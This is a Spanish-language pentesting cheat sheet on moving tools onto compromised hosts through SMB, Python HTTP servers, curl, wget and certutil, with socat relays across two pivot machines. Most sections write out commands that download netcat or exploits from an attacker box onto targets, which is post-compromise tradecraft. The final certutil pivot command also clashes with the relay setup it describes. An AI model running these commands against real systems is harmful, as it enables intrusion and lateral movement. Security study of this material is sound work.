
**---------------------------------------SMB SERVER--------------------------------------

En el caso de que nos topemos con una máquina Windows con SMB activo y queramos transferirle algún binario, podemos montarnos desde la Kali un servidor Samba.

```
smbserver.py smbFolder $(pwd) -smb2support
```

Con el anterior comando montamos el servidor Samba en la kali, y creamos un recurso compartido el cual está en la carpeta actual, llamado smbFolder y le damos soporte para smb2.

***Si la Windows tiene conexión directa con nuestra Kali:

```
dir \\IPkali\smbFolder
```

***Si la Windows no tiene conexión directa con nuestra Kali (tiramos de socat), imaginemos que hay dos máquinas entre nuestra kali y la Windows.*

*Windows* = 172.18.0.128    y     192.168.100.130

*Comprometida2* = 192.168.100.128      y       10.10.0.129

*Comprometida1* = 10.10.0.128       y       192.168.111.38

*Kali* = 192.168.111.106

Primero compartimos la carpeta Samba desde la Kali:

```
smbserver.py smbFolder $(pwd) -smb2support
```

Luego desde la Comprometida2 nos ponemos a la escucha con socat para redirigir el tráfico a la Comprometida1 al puerto 445, enviándolo al nodo de la Comprometida1 que comunica con la Comprometida2. 

```
./socat TCP-LISTEN:445,fork,reuseaddr TCP:10.10.0.128:445
```

Luego desde la Comprometida1 nos ponemos a la escucha con socat para redirigir el tráfico a la Kali al puerto 445 (SMB), enviándolo al nodo de la Kali que comunica con la Comprometida1.

```
./socat TCP-LISTEN:445,fork,reuseaddr TCP:192.168.111.106:445
```

Ahora desde la Windows (en un cmd) podemos listar los recursos del smbFolder de la kali (haciendo la petición al nodo de la Comprometida2 que comunica con la Windows)

```
dir \\192.168.100.128\smbFolder
```

Y descargar lo que sea necesario (exploit, netcat, etc...)

```
copy \\192.168.100.128\smbFolder\nc.exe C:\Windows\Temp\nc.exe
```

*RECORDAR QUE EXISTE NETCAT DE 32 Y DE 64 BITS, USAR EL NECESARIO.*


**------------------------------------------CURL-------------------------------------------

Lo primero es montar un servidor http en python donde estén los archivos/carpetas que queramos compartir.

```
python3 -m http.server 80
```

***Si tenemos conexión directa con el objetivo, desde la máquina objetivo:

```
curl -O http://IPkali/archivo
```

***Si NO tenemos conexión directa y tenemos que tirar de túneles y socat.

Imaginemos que tenemos dos hosts entre la Kali y el Objetivo.

*Objetivo* = 172.18.0.128    y     192.168.100.130

*Comprometida2* = 192.168.100.128      y       10.10.0.129

*Comprometida1* = 10.10.0.128       y       192.168.111.38

*Kali* = 192.168.111.106

Desde la máquina Kali levantamos el servidor con python.

```
python3 -m http.server 80
```

Desde la máquina Comprometida2 usamos socat para redirigir el tráfico a la Comprometida1 por el nodo que las comunica.

*USO EL PUERTO 8000 PARA SOCAT SUPONIENDO QUE ESTÉ LIBRE, SINO USAR OTRO.*

```
./socat TCP-LISTEN:8000,fork,reuseaddr TCP:10.10.0.128:8000
```

Desde la máquina Comprometida1 usamos socat para redirigir el tráfico a la Kali por el nodo que las comunica al puerto donde está el servidor, en este caso al puerto 80.

```
./socat TCP-LISTEN:8000,fork,reuseaddr TCP:192.168.111.106:80
```

Desde la máquina objetivo ejecutamos el siguiente comando, para hacerle la petición a la Comprometida2 por el nodo que las comunica y que socat rediriga el tráfico hasta la kali para descargar el archivo.

```
curl -O http://192.168.100.128:8000/archivo
```


**-----------------------------------------WGET-------------------------------------------

Lo primero es montar un servidor http en python donde estén los archivos/carpetas que queramos compartir.

```
python3 -m http.server 80
```

***Si tenemos conexión directa con el objetivo, desde la máquina objetivo:

```
wget http://IPkali/archivo
```

***Si NO tenemos conexión directa y tenemos que tirar de túneles y socat.

Imaginemos que tenemos dos hosts entre la Kali y el Objetivo.

*Objetivo* = 172.18.0.128    y     192.168.100.130

*Comprometida2* = 192.168.100.128      y       10.10.0.129

*Comprometida1* = 10.10.0.128       y       192.168.111.38

*Kali* = 192.168.111.106

Desde la máquina Kali levantamos el servidor con python.

```
python3 -m http.server 80
```

Desde la máquina Comprometida2 usamos socat para redirigir el tráfico a la Comprometida1 por el nodo que las comunica.

*USO EL PUERTO 8000 PARA SOCAT SUPONIENDO QUE ESTÉ LIBRE, SINO USAR OTRO.*

```
./socat TCP-LISTEN:8000,fork,reuseaddr TCP:10.10.0.128:8000
```

Desde la máquina Comprometida1 usamos socat para redirigir el tráfico a la Kali por el nodo que las comunica al puerto donde está el servidor, en este caso al puerto 80.

```
./socat TCP-LISTEN:8000,fork,reuseaddr TCP:192.168.111.106:80
```

Desde la máquina objetivo ejecutamos el siguiente comando, para hacerle la petición a la Comprometida2 por el nodo que las comunica y que socat rediriga el tráfico hasta la kali para descargar el archivo.

```
wget http://192.168.100.128:8000/archivo
```

*Existe una versión de wget para windows la cual por defecto en kali se encuentra en:

/usr/share/windows-resources/binaries/wget.exe


**---------------------------------CERTUTIL WINDOWS----------------------------------

Lo primero es levantar el servidor con python en la máquina Kali.

```
python3 -m http.server 80
```

***Si tenemos conexión directa con el objetivo:

```
certutil.exe -urlcache -f http://IPkali/archivo archivofinal
```

De ésta manera descargamos un archivo de la kali y de nombre le ponemos archivofinal (y se guarda en la carpeta actual).

Si queremos guardarlo en Temp o x carpeta con permisos de escritura para user actual:

```
certutil.exe -urlcache -f http://IPkali/archivo C:\Temp\archivofinal
```

***Si NO tenemos conexión directa y tenemos que tirar de túneles y socat.

Imaginemos que tenemos dos hosts entre la Kali y el Objetivo.

*Objetivo* = 172.18.0.128    y     192.168.100.130

*Comprometida2* = 192.168.100.128      y       10.10.0.129

*Comprometida1* = 10.10.0.128       y       192.168.111.38

*Kali* = 192.168.111.106

Desde la máquina Kali levantamos el servidor con python.

```
python3 -m http.server 80
```

Desde la máquina Comprometida2 usamos socat para redirigir el tráfico a la Comprometida1 por el nodo que las comunica.

*USO EL PUERTO 8000 PARA SOCAT SUPONIENDO QUE ESTÉ LIBRE, SINO USAR OTRO.*

```
./socat TCP-LISTEN:8000,fork,reuseaddr TCP:10.10.0.128:8000
```

Desde la máquina Comprometida1 usamos socat para redirigir el tráfico a la Kali por el nodo que las comunica al puerto donde está el servidor, en este caso al puerto 80.

```
./socat TCP-LISTEN:8000,fork,reuseaddr TCP:192.168.111.106:80
```

Desde la máquina objetivo ejecutamos el siguiente comando, para hacerle la petición a la Comprometida2 por el nodo que las comunica y que socat rediriga el tráfico hasta la kali para descargar el archivo.

```
certutil.exe -urlcache -f http://IPkali/archivo C:\Temp\archivofinal
```
